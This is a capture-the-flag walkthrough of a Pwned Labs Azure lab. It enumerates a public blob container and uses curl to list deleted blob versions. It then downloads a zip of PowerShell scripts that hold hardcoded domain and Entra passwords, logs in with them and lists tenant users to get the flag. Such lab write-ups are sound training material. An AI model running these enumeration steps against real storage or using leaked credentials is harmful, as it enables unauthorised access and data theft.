---
description: Compromising a publicly accessible Azure Blob Storage to gain initial access into an enterprise environment.  
title: Pwned Labs - Azure Blob Container to Initial Access
date: 2024-09-11 00:00:00 +0200
categories: [Cloud, Pwned Labs, Azure]
tags: [cloud, hacking, pwnedlabs, azure, entra, powershell]
#show_image_post: true                                   # Change this to true
#image: /assets/img/                # Add infocard image here for post preview image

---
# Target Endpoint: http://dev.megabigtech.com/$web/index.html

## Scenario

Mega Big Tech have adopted a hybrid cloud architecture and continues to use a local on-premise Active Directory domain, as well as the Azure cloud. They are wary of being targeted due to their importance in the tech world, and have asked your team to assess the security of their infrastructure, including cloud services. An interesting URL has been found in some public documentation, and you are tasked with assessing it.

## Lab prerequisites

Basic Windows command line knowledge

## Learning outcomes

Familiarity with the Azure CLI
Identification and enumeration of Azure Blob Container
Leverage blob previous version functionality to reveal secrets
Understand how this attack chain could have been prevented

## Difficulty

Beginner

## Enumeration

Browsing to the target URL we are presented with the following website:
![insert](/assets/img/Megabigtech.png)

Looking at the source code of the website we can see there are some static .js files being hosted from a blob storage account:

```htm
<script type="text/javascript" charset="UTF-8" src="https://mbtwebsite.blob.core.windows.net/$web/static/util.js.download"></script>
```


Further enumeration shows that the site itself is being hosted from the blob storage if you look at the `x-ms-blob-type` header. 

```console
PS C:\Users\Michael> Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head

StatusCode        : 200
StatusDescription : OK
Content           :
RawContent        : HTTP/1.1 200 OK
                    Content-MD5: JSe+sM+pXGAEFInxDgv4CA==
                    x-ms-request-id: e984f5c7-301e-00bc-7588-049afe000000
                    x-ms-version: 2009-09-19
                    x-ms-lease-status: unlocked
                    x-ms-blob-type: BlockBlob
                    Content...
Forms             : {}
Headers           : {[Content-MD5, JSe+sM+pXGAEFInxDgv4CA==], [x-ms-request-id, e984f5c7-301e-00bc-7588-049afe000000],
                    [x-ms-version, 2009-09-19], [x-ms-lease-status, unlocked]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : System.__ComObject
RawContentLength  : 0
```


We can confirm this by the `Server` header returning `Windows-Azure-Blob` that was truncated from previous result:

```console
PS C:\Users\Michael> Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers

Key               Value
---               -----
Content-MD5       JSe+sM+pXGAEFInxDgv4CA==
x-ms-request-id   22aff6da-901e-0051-238a-04d1b3000000
x-ms-version      2009-09-19
x-ms-lease-status unlocked
x-ms-blob-type    BlockBlob
Content-Length    782359
Content-Type      text/html
Date              Wed, 11 Sep 2024 20:34:40 GMT
ETag              0x8DBD1A84E6455C0
Last-Modified     Fri, 20 Oct 2023 20:08:20 GMT
Server            Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0
```

We can list the files being hosted in the blob container through a browser using the below url:

https://mbtwebsite.blob.core.windows.net/web?restype=container&comp=list



```console
<EnumerationResults ContainerName="https://mbtwebsite.blob.core.windows.net/$web">
<Blobs>
<Blob>
<Name>index.html</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/index.html</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 20:08:20 GMT</Last-Modified>
<Etag>0x8DBD1A84E6455C0</Etag>
<Content-Length>782359</Content-Length>
<Content-Type>text/html</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>JSe+sM+pXGAEFInxDgv4CA==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/application-0162b80622a4b825c801f8afcd695b5918649df6f9b26eb012974f9b00a777c5.css</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/application-0162b80622a4b825c801f8afcd695b5918649df6f9b26eb012974f9b00a777c5.css</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:07 GMT</Last-Modified>
<Etag>0x8DBD18ACCED483A</Etag>
<Content-Length>18303</Content-Length>
<Content-Type>text/css</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>M/behUnHOMyLlbz9NxDo3A==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/application-76970cb8dc49a9af2f2bbc74a0ec0781ef24ead86c4f7b6273577d16c2f1506a.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/application-76970cb8dc49a9af2f2bbc74a0ec0781ef24ead86c4f7b6273577d16c2f1506a.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:07 GMT</Last-Modified>
<Etag>0x8DBD18ACCFADAD2</Etag>
<Content-Length>70364</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>2+ukSwvKgyhElia4g09ehw==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/common.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/common.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:07 GMT</Last-Modified>
<Etag>0x8DBD18ACCFD9988</Etag>
<Content-Length>260277</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>SiG1SVedijy9PSpi3AN61A==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/css</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/css</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:07 GMT</Last-Modified>
<Etag>0x8DBD18ACCFD727B</Etag>
<Content-Length>61584</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>Zt5NtEoCaKZrT/2rHwSzHw==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/iframe_api</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/iframe_api</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:07 GMT</Last-Modified>
<Etag>0x8DBD18ACCF0CA32</Etag>
<Content-Length>993</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>mAkwQL/A6WmUU+wnZcJ27w==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/jquery-3.6.0.min.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/jquery-3.6.0.min.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:07 GMT</Last-Modified>
<Etag>0x8DBD18ACD1AE134</Etag>
<Content-Length>89501</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>j7j+5PzDzIb/bHJBVMScQg==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/js</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/js</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD42D5BA</Etag>
<Content-Length>284312</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>KI9rEm0pK5CUJ8taqzkyJQ==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/magnific-popup-2f7f85183333c84a42262b5f8a4f8251958809e29fa31c65bdee53c4603502cd.css</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/magnific-popup-2f7f85183333c84a42262b5f8a4f8251958809e29fa31c65bdee53c4603502cd.css</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD391324</Etag>
<Content-Length>5269</Content-Length>
<Content-Type>text/css</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>P+zCAqNImbva/ZDdwc9KpA==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/magnific-popup.min-37130bcc3f8b01fe7473f8bb60a9aea35dc77c05eedc37fbd70135363feb6999.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/magnific-popup.min-37130bcc3f8b01fe7473f8bb60a9aea35dc77c05eedc37fbd70135363feb6999.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD39FD64</Etag>
<Content-Length>20173</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>3CUhak05JeDMk8aioBUxzw==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/player.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/player.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD4398EA</Etag>
<Content-Length>37626</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>Eb3CdS92CUphY9xBUWDmxg==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/swiper-18be8aa3f032dded246a45a9da3dafdb3934e39e1f1b3b623c1722f3152b2788.css</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/swiper-18be8aa3f032dded246a45a9da3dafdb3934e39e1f1b3b623c1722f3152b2788.css</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD44D135</Etag>
<Content-Length>21726</Content-Length>
<Content-Type>text/css</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>O4lCx/ZgXeqvoMf7cNRlXQ==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/swiper.min-d36969d50f8c2fa3a00a68e55fe929e3af3fdd249cf33fd128b6a17a410e2c59.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/swiper.min-d36969d50f8c2fa3a00a68e55fe929e3af3fdd249cf33fd128b6a17a410e2c59.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD646280</Etag>
<Content-Length>120650</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>f+8mcPo6KXeuFvr9pk2UCA==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/util.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/util.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD6B665D</Etag>
<Content-Length>157918</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>4lQqHVXbihhsIjwhvf1OlQ==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
<Blob>
<Name>static/www-widgetapi.js.download</Name>
<Url>https://mbtwebsite.blob.core.windows.net/$web/static/www-widgetapi.js.download</Url>
<Properties>
<Last-Modified>Fri, 20 Oct 2023 16:37:08 GMT</Last-Modified>
<Etag>0x8DBD18ACD75EC24</Etag>
<Content-Length>217803</Content-Length>
<Content-Type>application/octet-stream</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>3+rAAKmCYIM8I8bIfkagcA==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
</Blobs>
<NextMarker/>
</EnumerationResults>
```


Trying to look for previous versions of files would show deleted files with older versions still available in the blob. 

https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions

However we do not get the results we are looking for:


```console
<Error>
<Code>InvalidQueryParameterValue</Code>
<Message>Value for one of the query parameters specified in the request URI is invalid. RequestId:ad5bda6f-b01e-00d0-5a8c-047169000000 Time:2024-09-11T20:54:58.9406411Z</Message>
<QueryParameterName>include</QueryParameterName>
<QueryParameterValue>versions</QueryParameterValue>
<Reason>Invalid query parameter value.</Reason>
</Error>
```

Reading up on the blob API Documentation [here](https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=microsoft-entra-id#uri-parameters) we can see the `versions` parameter only supports versions 2019-12-12 and later. Using Curl we can specify the header `x-ms-version` .

```console
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions'
```

This however returns alot of unstructured data... 

![Curl Results](/assets/img/curl%20unstructured.png)

We need to make this human readable.. 

We can do that by using `xmllint` to format the XML data. Run the following to install the package:

`apt install libxml2-utils`

Now we can curl again using below piped commands:

```console
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
```

In the reponse we see a very interesting .zip file with a version number which means we can download it!

![Structured Curl](/assets/img/Curl%20results%20structured.png)

Downloading the file:

```console
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2024-03-29T20:55:40.8265593Z'  --output scripts-transfer.zip
```

This .zip file contains 2 scripts namely `stale_computer_accounts.ps1` & `entra_users.ps1`. Looking at the contents of `stale_computer_accounts.ps1` we can see login credentials to the megabigtech.local domain for `marcus_adm`!

```console
# Define the target domain and OU
$domain = "megabigtech.local"
$ouName = "Review"

# Set the threshold for stale computer accounts (adjust as needed)
$staleDays = 90  # Computers not modified in the last 90 days will be considered stale

# Hardcoded credentials
$securePassword = ConvertTo-SecureString "MegaBigTech123!" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("marcus_adm", $securePassword)

# Get the current date
$currentDate = Get-Date

# Calculate the date threshold for stale accounts
$thresholdDate = $currentDate.AddDays(-$staleDays)

# Disable and move stale computer accounts to the "Review" OU
Get-ADComputer -Filter {(LastLogonTimeStamp -lt $thresholdDate) -and (Enabled -eq $true)} -SearchBase "DC=$domain" -Properties LastLogonTimeStamp -Credential $credential |
  ForEach-Object {
    $computerName = $_.Name
    $computerDistinguishedName = $_.DistinguishedName

    # Disable the computer account
    Disable-ADAccount -Identity $computerDistinguishedName -Credential $credential

    # Move the computer account to the "Review" OU
    Move-ADObject -Identity $computerDistinguishedName -TargetPath "OU=$ouName,DC=$domain" -Credential $credential
    
    Write-Host "Disabled and moved computer account: $computerName"
  }

```

Looking at `entra_users.ps1` we see more hardcoded credentials for marcus@megabigtech.com!

```console
# Install the required modules if not already installed
# Install-Module -Name Az -Force -Scope CurrentUser
# Install-Module -Name MSAL.PS -Force -Scope CurrentUser

# Import the required modules
Import-Module Az
Import-Module MSAL.PS

# Define your Azure AD credentials
$Username = "marcus@megabigtech.com"
$Password = "TheEagles12345!" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

# Authenticate to Azure AD using the specified credentials
Connect-AzAccount -Credential $Credential

# Define the Microsoft Graph API URL
$GraphApiUrl = "https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName"

# Retrieve the access token for Microsoft Graph
$AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token

# Create a headers hashtable with the access token
$headers = @{
    "Authorization" = "Bearer $AccessToken"
    "ContentType"   = "application/json"
}

# Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell
$response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers

# Output the response (formatted as JSON)
$response | ConvertTo-Json

```

Running the `entra_users.ps1` script we see these Entra credentials are still valid as we login and get Entra user info!

```json
Microsoft Azure Sponsorship Default Directory
{
    "@odata.context":  "https://graph.microsoft.com/v1.0/$metadata#users",
    "value":  [
                  {
                      "businessPhones":  "",
                      "displayName":  "Akari Fukimo",
                      "givenName":  "Akari",
                      "jobTitle":  "Cloud engineer",
                      "mail":  null,
                      "mobilePhone":  null,
                      "officeLocation":  null,
                      "preferredLanguage":  null,
                      "surname":  "Fukimo",
                      "userPrincipalName":  "Akari.Fukimo@megabigtech.com",
                      "id":  "f99e0d7f-3e0f-41ce-8fcb-cf7ac49995d1"
                  },
                  {
                      "businessPhones":  "",
                      "displayName":  "Akira Suzuki",
                      "givenName":  null,
                      "jobTitle":  null,
                      "mail":  null,
                      "mobilePhone":  null,
                      "officeLocation":  null,
                      "preferredLanguage":  null,
                      "surname":  null,
                      "userPrincipalName":  "Akira.Suzuki@megabigtech.com",
                      "id":  "4e96be22-f417-49b5-9f98-b74f8258c8ae"
                  },
                  {
                      "businessPhones":  "",
                      "displayName":  "Angelina Lee",
                      "givenName":  null,
                      "jobTitle":  "Manager",
                      "mail":  null,
                      "mobilePhone":  null,
                      "officeLocation":  null,
                      "preferredLanguage":  null,
                      "surname":  null,
                      "userPrincipalName":  "alee@megabigtech.com",
                      "id":  "a2e5eb93-7d64-40d8-9e23-715a9cca5112"
                  },
                  {
                      "businessPhones":  "",
                      "displayName":  "Alexandra Wu",
                      "givenName":  null,
                      "jobTitle":  "Integrations Manager (Acquisitions)",
                      "mail":  null,
                      "mobilePhone":  null,
                      "officeLocation":  null,
                      "preferredLanguage":  null,
                      "surname":  null,
                      "userPrincipalName":  "Alexandra.Wu@megabigtech.com",
                      "id":  "e00d3fec-e7c4-4efa-bc92-e5db39127a99"
                  },
                  {
                      "businessPhones":  "",
                      "displayName":  "Alice Garcia",
                      "givenName":  null,
                      "jobTitle":  null,
                      "mail":  null,
                      "mobilePhone":  null,
                      "officeLocation":  null,
                      "preferredLanguage":  null,
                      "surname":  null,
                      "userPrincipalName":  "Alice.Garcia@megabigtech.com",
                      "id":  "f78536e6-c5ba-4c4e-ae74-eab2a1a34e96"
                  }
```


This gives us initial access into the Megabigtech Tenant which could allow us to pivot and setup persistence. 

To complete the challenge and get the flag you need to run below:

`Get-AzADUser -SignedIn | fl`

```console
PS C:\Users\Michael\Desktop\scripts-transfer> Get-AzADUser -SignedIn | fl


AccountEnabled                  :
AgeGroup                        :
ApproximateLastSignInDateTime   :
BusinessPhone                   : {}
City                            :
CompanyName                     :
ComplianceExpirationDateTime    :
ConsentProvidedForMinor         :
Country                         :
CreatedDateTime                 :
CreationType                    :
DeletedDateTime                 :
Department                      :
DeviceVersion                   :
DisplayName                     : Marcus Hutch
EmployeeHireDate                :
EmployeeId                      :
EmployeeOrgData                 : {
                                  }
EmployeeType                    :
ExternalUserState               :
ExternalUserStateChangeDateTime :
FaxNumber                       :
GivenName                       : Marcus
Id                              : 41c178d3-c246-4c00-98f0-8113bd631676
Identity                        :
ImAddress                       :
IsResourceAccount               :
JobTitle                        : Flag: 39c6217c4a28ba7f3198e5542f9e50c4
LastPasswordChangeDateTime      :
LegalAgeGroupClassification     :
Mail                            :
MailNickname                    :
Manager                         : {
                                  }
```

And that concludes the 'Azure Blob Container to Initial Access' lab from [PwnedLabs](https://pwnedlabs.io/)!